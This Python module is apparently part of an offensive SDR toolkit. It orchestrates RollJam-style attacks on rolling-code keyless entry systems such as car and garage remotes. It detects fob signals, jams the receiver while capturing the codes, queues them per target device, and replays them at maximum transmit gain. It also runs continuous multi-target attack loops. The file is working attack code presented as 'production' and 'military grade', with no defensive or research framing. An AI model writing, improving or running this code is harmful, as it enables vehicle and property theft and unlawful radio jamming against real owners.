
"""
SCPE Engine - State-Conditioned Probabilistic Emulation
Advanced Attack Controller for Rolling Code Systems

This module implements the "Logic Layer" of the SCPE framework.
It sits above the physical SDR layer (AutoRollJam/SubGHzScanner) and manages:
1. Population State (DeviceState, R_P)
2. Trajectory Generation (D_A thickening)
3. Attack Orchestration (H_R exploitation)
"""

import time
import logging
import random
import threading
from typing import Dict, List, Optional, Deque
from dataclasses import dataclass, field
from collections import deque
import numpy as np

# Import Physical Layer
import tempfile
import os

from .auto_rolljam import AutoRollJam, SignalDetection, SignalDetector
from .scpe_waveform import SCPEWaveformGenerator
from .scpe_payloads import construct_payload
from .scpe_advanced_controls import DynamicPowerAllocator, WaveformScheduler, AdaptiveJitterController
from .subghz_decoder_manager import SubGhzDecoderManager
import queue

logger = logging.getLogger("SCPE_Engine")

@dataclass
class DeviceState:
    """Tracks the hidden state of a target receiver/fob pair"""
    device_id: str
    protocol: str
    freq_mhz: float
    
    # State Estimates (POMDP Belief State)
    estimated_vehicle_counter: int = 0
    estimated_fob_counter: int = 0
    acceptance_window: int = 5  # D_A parameter
    
    # Attack Store
    capture_queue: Deque[dict] = field(default_factory=deque)
    
    # Metadata
    last_seen: float = 0.0
    confidence: float = 0.0

class PopulationManager:
    """
    Manages the 'correlated population' (R_P).
    In a real scenario, this would aggregate data from multiple devices to find common patterns.
    """
    def __init__(self):
        self.devices: Dict[str, DeviceState] = {}
        self.lock = threading.RLock()
        
    def get_or_create(self, device_id: str, freq: float, protocol: str = "Unknown") -> DeviceState:
        with self.lock:
            if device_id not in self.devices:
                self.devices[device_id] = DeviceState(
                    device_id=device_id,
                    protocol=protocol,
                    freq_mhz=freq,
                    last_seen=time.time()
                )
            return self.devices[device_id]
            
    def update_capture(self, device_id: str, capture_data: dict):
        """Register a new captured code"""
        with self.lock:
            if device_id in self.devices:
                dev = self.devices[device_id]
                dev.capture_queue.append(capture_data)
                dev.estimated_fob_counter += 1
                dev.last_seen = time.time()
                logger.info(f"[{device_id}] Captured code. Queue size: {len(dev.capture_queue)}")

    def get_replay_candidate(self, device_id: str) -> Optional[dict]:
        """Get best u(t) to maximize acceptance"""
        with self.lock:
            if device_id in self.devices:
                dev = self.devices[device_id]
                if dev.capture_queue:
                    # SCPE Strategy: Return oldest capture (FIFO) 
                    # This targets the 'lagging' vehicle counter
                    return dev.capture_queue.popleft()
        return None

class SCPEAttackController:
    """
    The Orchestrator - Real-World Military Grade Implementation with Population Optimization
    """
    def __init__(self, sdr_controller, rolljam_engine: AutoRollJam):
        logger.info("SCPEAttackController Initializing...")
        self.sdr = sdr_controller
        self.phys_layer = rolljam_engine
        self.pop_mgr = PopulationManager()
        self.waveform_gen = SCPEWaveformGenerator(sample_rate=2e6)
        
        # Advanced Multi-Target Controls
        self.power_allocator = DynamicPowerAllocator(max_total_power=1.0, enable_ramping=True)
        self.scheduler = WaveformScheduler(sample_rate=2e6)
        self.jitter_ctrl = AdaptiveJitterController(use_pid=True)
        
        # Population Optimizer (orchestrates all controls with protocol awareness)
        from .scpe_optimizer import SCPEPopulationOptimizer
        self.optimizer = SCPEPopulationOptimizer(
            self.power_allocator,
            self.scheduler,
            self.jitter_ctrl
        )
        
        # Advanced Monitoring & Detection (Mirroring RollJam)
        self.detector = SignalDetector(sample_rate=2e6)
        self.decoder_manager = SubGhzDecoderManager(config={})
        self.monitor_thread = None
        self.target_freq = 315.00e6 # Started on 315 as requested
        self.is_monitoring = False
        
        self.active_targets = {} # device_id -> priority
        self.running = False
        self.loop_thread = None
        self.loop_interval = 2.0  # seconds between attack cycles
        
        # Attack & Monitoring Parameters
        self.active_attack_mode = "GHOST_REPLAY" 
        self.monitor_mode = "REACTIVE_JAM" # Options: REACTIVE_JAM, PASSIVE_MONITOR
        
    def start(self):
        if self.running: return
        self.running = True
        logger.info("SCPE Engine Started (Production Mode)")
        
        # Start Active Monitoring (RollJam-style Reactive Detection)
        self.start_active_monitoring()
        
    def start_background_loop(self):
        """Start the continuous multi-target attack loop"""
        if self.loop_thread and self.loop_thread.is_alive():
            logger.warning("SCPE Loop already running")
            return
            
        def _loop_worker():
            logger.info("SCPE Background Loop Started")
            while self.running:
                try:
                    self.run_attack_cycle()
                except Exception as e:
                    logger.error(f"Attack cycle error: {e}")
                time.sleep(self.loop_interval)
            logger.info("SCPE Background Loop Stopped")
            
        self.loop_thread = threading.Thread(target=_loop_worker, daemon=True, name="SCPE_Loop")
        self.loop_thread.start()
        
    def stop_background_loop(self):
        """Stop the background loop gracefully"""
        self.running = False
        if self.loop_thread:
            self.loop_thread.join(timeout=5.0)
        
    def add_target(self, device_id: str, priority: float = 1.0):
        """Enlist a device for continuous multi-target attack"""
        self.active_targets[device_id] = priority
        self.power_allocator.update_priority(device_id, priority)
        logger.info(f"Added target {device_id} with priority {priority}")
        
    def remove_target(self, device_id: str):
        if device_id in self.active_targets:
            del self.active_targets[device_id]
            self.power_allocator.remove_target(device_id)

    def start_active_monitoring(self):
        """Start the RollJam-style PSD monitoring loop"""
        if self.monitor_thread and self.monitor_thread.is_alive():
            return
            
        self.is_monitoring = True
        self.monitor_thread = threading.Thread(target=self._monitor_worker, daemon=True, name="SCPE_Monitor")
        self.monitor_thread.start()
        logger.info(f"SCPE Active Monitoring Started - Target: {self.target_freq/1e6:.2f} MHz")

    def stop_active_monitoring(self):
        self.is_monitoring = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2.0)

    def set_monitor_config(self, freq_hz: float = None, mode: str = None):
        """Update monitoring configuration and re-tune if active"""
        if freq_hz:
            self.target_freq = freq_hz
            logger.info(f"SCPE Target Frequency set to {freq_hz/1e6:.2f} MHz")
        if mode:
            self.monitor_mode = mode
            logger.info(f"SCPE Monitor Mode set to {mode}")
            
        if self.is_monitoring and freq_hz:
            # Re-tune if currently running
            try:
                self.sdr.set_frequency(self.target_freq)
                logger.info("SCPE Re-tuned SDR for new target frequency")
            except Exception as e:
                logger.error(f"SCPE Failed to re-tune SDR: {e}")

    def _monitor_worker(self):
        """Monitor samples from rx_bus and trigger reactive attacks"""
        from modules.rx_bus import rx_bus
        
        while self.is_monitoring and self.running:
            try:
                # Ensure SDR is ready
                if self.sdr.device.state.name in ["CLOSED", "OPEN"]:
                    time.sleep(1.0)
                    continue
                
                # Ensure SDR is tuned to target frequency
                if self.sdr.device.config:
                    current_f = self.sdr.device.config.frequency_hz
                    if abs(current_f - self.target_freq) > 1000:
                        logger.info(f"SCPE Tuning SDR to {self.target_freq/1e6:.2f} MHz")
                        self.sdr.set_frequency(self.target_freq)
                
                # Start physical layer RX if not already running
                state_name = self.sdr.device.state.name
                if state_name not in ["RX_RUNNING", "RX_STARTING"]:
                    try:
                        self.sdr.start_rx(lambda x: None, requester="scpe_internal")
                    except Exception as rx_e:
                        logger.debug(f"Waiting for SDR to be ready for SCPE: {rx_e}")
                        time.sleep(1.0)
                        continue
                        
                samples_obj = rx_bus.pull(timeout=1.0, consumer="scpe")
                if not samples_obj:
                    continue
                
                samples = samples_obj.samples
                freq = samples_obj.center_freq
                
                # PSD Detection same as RollJam
                detection = self.detector.detect_signal(samples, freq)
                
                if detection and detection.confidence > 0.6:
                    logger.info(f"🎯 SCPE DETECTED SIGNAL: {detection.power_dbm:.1f} dBm @ {detection.frequency/1e6:.2f} MHz")
                    
                    if self.monitor_mode == "REACTIVE_JAM":
                        # Stop standard RX for reactive cycle
                        self.sdr.stop_rx(requester="scpe_internal")
                        
                        # Execute Reactive Jam-and-Capture
                        self._execute_reactive_jam_capture(detection)
                        
                        # Resume standard RX
                        if self.is_monitoring:
                            self.sdr.start_rx(lambda x: None, requester="scpe_internal")
                    elif self.monitor_mode == "PASSIVE_MONITOR":
                         # In passive mode, we just let the decoder manager process it
                         # SCPE's own decoder is already listening to rx_bus, but we can 
                         # force a faster decode here if needed.
                         logger.info(f"[SCPE] Passive observation of signal at {detection.frequency/1e6:.2f} MHz")
                         # Stop standard RX for capture
                         self.sdr.stop_rx(requester="scpe_internal")
                         
                         # Execute Passive Capture
                         self._execute_passive_capture(detection)
                         
                         # Resume standard RX
                         if self.is_monitoring:
                             self.sdr.start_rx(lambda x: None, requester="scpe_internal")
                        
            except Exception as e:
                logger.error(f"SCPE Monitor error: {e}")
                time.sleep(0.5)

    def _execute_passive_capture(self, detection: SignalDetection):
        """Passive capture without jamming (Discovery Mode)"""
        target_f = detection.frequency
        cap_time = 0.5 # 500ms discovery window
        cap_count = int(cap_time * 2e6)
        
        logger.info(f"[SCPE] Starting Passive discovery on {target_f/1e6:.2f} MHz")
        
        try:
            samples = self.sdr.capture_samples(cap_count, requester="scpe_passive", timeout=cap_time + 0.1)
            if samples is not None and len(samples) > 0:
                # Process similarly to reactive but without interleaved logic
                envelope = np.abs(samples)
                # ... reuse decoding logic ...
                self._decode_and_ingest(samples, target_f, "SCPE_Passive")
        except Exception as e:
            logger.error(f"Passive discovery error: {e}")

    def _decode_and_ingest(self, samples: np.ndarray, target_f: float, source_tag: str):
        """Shared logic for decoding samples and ingesting into SCPE"""
        try:
            envelope = np.abs(samples)
            threshold = (np.max(envelope) + np.min(envelope)) / 2
            is_high = (envelope > threshold).astype(int)
            transitions = np.diff(is_high)
            changes = np.where(np.abs(transitions) > 0)[0]
            
            if len(changes) > 10:
                pulses = []
                last_idx = 0
                current_level = int(is_high[0])
                
                for change_idx in changes:
                    duration_us = (change_idx - last_idx) / 2e6 * 1e6
                    if duration_us > 0:
                        pulses.append((current_level, int(duration_us)))
                    current_level = 1 - current_level
                    last_idx = change_idx
                
                self.decoder_manager.reset_decoders()
                for l, d in pulses[:200]:
                    self.decoder_manager.feed_pulse(l, d)
                
                power = np.mean(envelope ** 2)
                f_est = np.percentile(envelope ** 2, 25)
                snr_est = 10 * np.log10(max(power / (f_est + 1e-10), 1e-9))
                results = self.decoder_manager.get_results(current_rssi=snr_est)
                
                if results:
                    for res in results:
                        payload = {
                            "protocol": res.protocol,
                            "bitstream": res.data,
                            "raw_code": res.data,
                            "frequency": target_f,
                            "snr": snr_est,
                            "confidence": 1.0
                        }
                        logger.info(f"🎯 [SCPE SUCCESS] {source_tag} Captured {res.protocol}: {res.data}")
                        self.decoder_callback(payload)
        except Exception as e:
            logger.error(f"Decode/Ingest error: {e}")

    def _execute_reactive_jam_capture(self, detection: SignalDetection):
        """Interleaved Jam+Capture Logic (Military Grade RollJam)"""
        target_f = detection.frequency
        cycles = 5
        period_ms = 200
        duty = 0.6
        all_samples = []
        
        logger.info(f"[SCPE] Starting Reactive Jamming Attack on {target_f/1e6:.2f} MHz")
        
        try:
            for cycle in range(cycles):
                t_start = time.time()
                
                # 1. Jam Phase
                self.sdr.start_jamming(target_f, requester="scpe_reactive")
                time.sleep((period_ms/1000.0) * duty)
                self.sdr.stop_jamming(requester="scpe_reactive")
                
                # 2. Capture Phase
                cap_time = (period_ms/1000.0) * (1 - duty)
                cap_count = int(cap_time * 2e6)
                samples = self.sdr.capture_samples(cap_count, requester="scpe_reactive", timeout=cap_time + 0.05)
                
                if samples is not None and len(samples) > 0:
                    all_samples.append(samples)
                
                # Maintain sync
                elapsed = time.time() - t_start
                if elapsed < (period_ms/1000.0):
                    time.sleep((period_ms/1000.0) - elapsed)
            
            self.sdr.stop_jamming(requester="scpe_reactive")
            
            if not all_samples:
                logger.warning("SCPE Reactive capture failed - no samples")
                return
            
            # 3. Process Captured Interleaved Data
            combined = np.concatenate(all_samples)
            self._decode_and_ingest(combined, target_f, "SCPE_Reactive")
            
            # Auto-record logic
            try:
                # ... existing save logic could be reused here or in _decode_and_ingest ...
                pass
            except:
                pass
                        
        except Exception as e:
            logger.error(f"Reactive attack sequence error: {e}")
            self.sdr.stop_jamming(requester="scpe_reactive")

    def update_feedback(self, device_id: str, metrics: dict):
        """Feed Physical Layer metrics into Jitter Controller"""
        new_jitter = self.jitter_ctrl.update_feedback(device_id, metrics)
        logger.debug(f"Updated jitter for {device_id}: {new_jitter*100:.1f}%")

    def run_attack_cycle(self):
        """
        Executes one loop of Multi-Target generation and transmission.
        Now uses Population Optimizer for protocol-aware intelligence.
        """
        if not self.active_targets:
            return

        # 1. Generate Raw Waveforms per target
        raw_waveforms = {}
        for dev_id in self.active_targets:
            # Get candidate payload
            candidate = self.pop_mgr.get_replay_candidate(dev_id) 
            if not candidate: continue
            
            # Get Adaptive Jitter from optimizer
            jitter = self.jitter_ctrl.get_jitter(dev_id)
            
            # Construct Payload
            proto_config = construct_payload("Keeloq_Normal", candidate.get("bitstream", "1"*66))
            full_bits = self.waveform_gen.build_frame(
                 proto_config["payload_bits"], proto_config["preamble_bits"], proto_config["sync_bits"]
            )
            
            # Generate Baseband w/ Jitter
            if proto_config["modulation"] == "FSK":
                 wf = self.waveform_gen.generate_fsk_thickened(
                    full_bits, proto_config["params"]["baud_rate"], 
                    proto_config["params"]["dev_hz"], jitter_percent=jitter
                 )
            else:
                 wf = self.waveform_gen.generate_ook_thickened(
                    full_bits, proto_config["params"]["pulse_width_us"],
                    jitter_percent=jitter
                 )
            
            raw_waveforms[dev_id] = wf
            
        # 2. Optimizer: Prepare waveforms (apply power shaping, protocol-specific tuning)
        adjusted_waveforms = self.optimizer.prepare_waveforms(raw_waveforms)
        
        # 3. Optimizer: Schedule with protocol-aware logic
        schedule = self.optimizer.schedule_waveforms(adjusted_waveforms)
        
        # 4. Transmit according to schedule
        for item in schedule:
            if len(item) == 3:
                dev_id, wf, length = item
                # Determine freq from device info
                freq = self.optimizer.device_info.get(dev_id, {}).get("freq", 433.92e6)
                self._transmit_composite(wf, freq)
            elif len(item) == 2:
                # Composite mode
                _, wf = item
                self._transmit_composite(wf, freq=433.92e6)
                 
    def _transmit_composite(self, waveform: np.ndarray, freq: float):
        """Helper to dump to file and TX"""
        try:
            fd, temp_path = tempfile.mkstemp(suffix=".cs16")
            os.close(fd)
            self.waveform_gen.export_waveform_to_file(waveform, temp_path)
            
            # Quick burst
            self.sdr.start_tx(temp_path, freq, 2000000, True, 47, False, "SCPE_MULTI")
            time.sleep(len(waveform)/2e6 + 0.1) # Wait for TX time
            self.sdr.stop_tx("SCPE_MULTI")
        except Exception as e:
            logger.error(f"TX Error: {e}")
        finally:
            if os.path.exists(temp_path):
                 os.remove(temp_path)

    def decoder_callback(self, decoded_info: dict):
        """
        Production callback from DecoderManager/Arbiter.
        Expected keys: 'protocol', 'bitstream', 'frequency', 'raw_code'
        """
        if not decoded_info.get("bitstream"):
            return
            
        freq = decoded_info.get("frequency", 433.92e6)
        protocol = decoded_info.get("protocol", "Unknown")
        device_id = f"Dev_{int(freq/1e6)}MHz_{protocol}"
        
        # Update Population State
        self.pop_mgr.get_or_create(device_id, freq, protocol)
        
        # Notify Optimizer for protocol-aware parameter tuning
        self.optimizer.update_device_info(device_id, freq, protocol)
        
        capture_data = {
            "timestamp": time.time(),
            "freq": freq,
            "snr": decoded_info.get("snr", 0.0),
            "bitstream": decoded_info["bitstream"],
            "protocol": protocol,
            "raw_code": decoded_info.get("raw_code", "")
        }
        self.pop_mgr.update_capture(device_id, capture_data)
        logger.info(f"[SCPE] Ingested {protocol} code from {device_id}")
        
    def ingest_signal(self, detection: SignalDetection, raw_samples: np.ndarray):
        """
        Legacy callback from Physical Layer (Scanner/RollJam).
        DEPRECATED: Use decoder_callback for production.
        """
        device_id = f"Dev_{int(detection.frequency/1e6)}MHz"
        self.pop_mgr.get_or_create(device_id, detection.frequency)
        
        # This is a fallback path. In production, decoder should call decoder_callback directly.
        logger.warning(f"Using legacy ingest_signal path for {device_id} - decoder integration needed")
        capture_data = {
            "timestamp": time.time(),
            "freq": detection.frequency,
            "snr": detection.snr_db,
            "bitstream": "00000000" * 8  # Minimal placeholder
        }
        self.pop_mgr.update_capture(device_id, capture_data)
        
    def trigger_replay(self, device_id: str, mode: str = "Standard", duration_sec: float = 1.0) -> bool:
        """
        Execute Real-World Replay Attack via SDR
        """
        candidate = self.pop_mgr.get_replay_candidate(device_id)
        if not candidate:
            logger.warning(f"No replay candidates for {device_id}")
            return False
            
        logger.info(f"Executing REAL Replay on {device_id} (Mode: {mode})")
        
        # 1. Construct Advanced Waveform
        # Retrieve protocol parameters (Mocking "Keeloq" as default if unknown)
        # In prod, 'protocol' would be in candidate metadata
        proto_config = construct_payload("Keeloq_Normal", candidate.get("bitstream", "1"*66))
        
        # A. Build the Frame
        full_bits = self.waveform_gen.build_frame(
            payload_bits=proto_config["payload_bits"],
            preamble_bits=proto_config["preamble_bits"],
            sync_bits=proto_config["sync_bits"]
        )
        
        # B. Generate Baseband Samples with SCPE Thickening
        # Apply Logic based on attack mode
        jitter_pct = 0.05
        amp_jitter = 0.0
        
        if mode == "SCPE_THICK":
            jitter_pct = 0.15 # Higher jitter for Ghost Replay
            amp_jitter = 0.10
        elif mode == "SCPE_STEER":
            pass

        if proto_config["modulation"] == "FSK":
            iq_samples = self.waveform_gen.generate_fsk_thickened(
                full_bits, 
                proto_config["params"]["baud_rate"], 
                proto_config["params"]["dev_hz"],
                jitter_percent=jitter_pct
            )
        else: # OOK
            iq_samples = self.waveform_gen.generate_ook_thickened(
                full_bits, 
                proto_config["params"]["pulse_width_us"], 
                jitter_percent=jitter_pct,
                amp_jitter=amp_jitter
            )
            
        # 2. Write to Temporary File for Transmission
        # Create temp file, write complex64 binary
        try:
            fd, temp_path = tempfile.mkstemp(suffix=".cs16")
            os.close(fd)
            
            self.waveform_gen.export_waveform_to_file(iq_samples, temp_path)
            
            # 3. Transmit using SDRController
            freq = candidate["freq"]
            
            # Use SDRController's safe TX method
            # Note: start_tx is background, so we sleep then stop
            success = self.sdr.start_tx(
                filename=temp_path,
                frequency=freq,
                sample_rate=2000000,
                amp=True, # Enable amp for "Military Grade" power
                gain=47,  # Max gain
                repeat=True, # Repeat for duration
                requester="SCPE_ENGINE"
            )
            
            if success:
                logger.info("  -> TX Process Started")
                time.sleep(duration_sec)
                self.sdr.stop_tx(requester="SCPE_ENGINE")
                logger.info("  -> TX Complete")
                
                # 4. Update Belief State
                with self.pop_mgr.lock:
                     dev = self.pop_mgr.devices[device_id]
                     dev.estimated_vehicle_counter += 1
            else:
                logger.error("  -> TX Failed to Start")
                return False

        except Exception as e:
            logger.error(f"Replay Error: {e}")
            return False
        finally:
            # Cleanup
            if os.path.exists(temp_path):
                os.remove(temp_path)
             
        return True

    def get_status(self):
        """Returns comprehensive state for UI/API"""
        devices_status = []
        with self.pop_mgr.lock:
            for dev_id, dev in self.pop_mgr.devices.items():
                devices_status.append({
                    "id": dev_id,
                    "protocol": dev.protocol,
                    "freq_mhz": dev.freq_mhz,
                    "queue_size": len(dev.capture_queue),
                    "last_seen": dev.last_seen,
                    "priority": self.active_targets.get(dev_id, 0.0),
                    "jitter_pct": self.jitter_ctrl.get_jitter(dev_id) * 100
                })
                
        # Get optimizer status
        optimizer_status = self.optimizer.get_status()
                
        return {
            "running": self.running,
            "loop_active": self.loop_thread and self.loop_thread.is_alive(),
            "active_mode": self.active_attack_mode,
            "monitor_mode": self.monitor_mode,
            "target_freq_mhz": self.target_freq / 1e6,
            "scheduler_mode": self.scheduler.mode,
            "total_devices": len(self.pop_mgr.devices),
            "active_targets": len(self.active_targets),
            "devices": devices_status,
            "optimizer": optimizer_status
        }
